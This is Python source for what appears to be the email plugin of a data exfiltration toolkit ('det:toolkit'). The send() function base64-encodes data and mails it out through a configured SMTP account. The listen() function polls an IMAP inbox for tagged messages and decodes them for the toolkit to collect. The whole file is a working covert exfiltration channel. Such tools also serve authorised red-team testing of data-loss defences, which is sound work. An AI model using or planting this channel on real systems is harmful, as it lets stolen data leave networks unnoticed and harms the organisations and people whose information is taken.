import base64
import imaplib
from smtplib import SMTP
import email
import time
import sys
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import traceback

app_exfiltrate = None
config = None

def send(data):
    mail_server = SMTP(config['smtp_server'], port=config['smtp_port'])
    mail_server.connect(config['smtp_server'], config['smtp_port'])
    mail_server.starttls()
    mail_server.login(config['username'], config['password'])

    msg = MIMEMultipart()
    msg['From'] = config['username']
    msg['To'] = config['username']
    msg['Subject'] = "det:toolkit"
    msg.attach(MIMEText(base64.b64encode(data.encode()).decode()))
    app_exfiltrate.log_message(
        'info', "[email] Sending {} bytes in mail".format(len(data)))
    mail_server.sendmail(config['username'], config['username'], msg.as_string())

def listen():
    app_exfiltrate.log_message('info', "[email] Listening for mails...")
    client_imap = imaplib.IMAP4_SSL(config['imap_server'], port=config['imap_port'])
    try:
        client_imap.login(config['username'], config['password'])
    except Exception:
        traceback.print_exc()
        app_exfiltrate.log_message(
            'warning', "[email] Did not manage to authenticate with creds: {}:{}".format(config['username'], config['password']))
        sys.exit(-1)

    while True:
        client_imap.select("INBOX")
        typ, id_list = client_imap.uid(
            'search', None, "(UNSEEN SUBJECT 'det:toolkit')")
        for msg_id in id_list[0].split():
            msg_data = client_imap.uid('fetch', msg_id, '(RFC822)')
            raw_email = msg_data[1][0][1]
            # continue inside the same for loop as above
            raw_email_string = raw_email.decode('utf-8')
            # converts byte literal to string removing b''
            email_message = email.message_from_string(raw_email_string)
            # this will loop through all the available multiparts in mail
            for part in email_message.walk():
                if part.get_content_type() == "text/plain":  # ignore attachments/html
                    body = part.get_payload(decode=True)
                    data = body.split(b'\r\n')[0]
                    # print(data)
                    try:
                        app_exfiltrate.retrieve_data(base64.b64decode(data).decode())
                    except Exception as e:
                        print(e)
                else:
                    continue
        time.sleep(2)


def proxy():
    app_exfiltrate.log_message('info', "[proxy] [email] proxy mode unavailable (useless) for email plugin...")


class Plugin:
    def __init__(self, app, conf):
        global app_exfiltrate, config
        config = conf
        app.register_plugin('email', {'send': send, 'listen': listen, 'proxy': proxy})
        app_exfiltrate = app
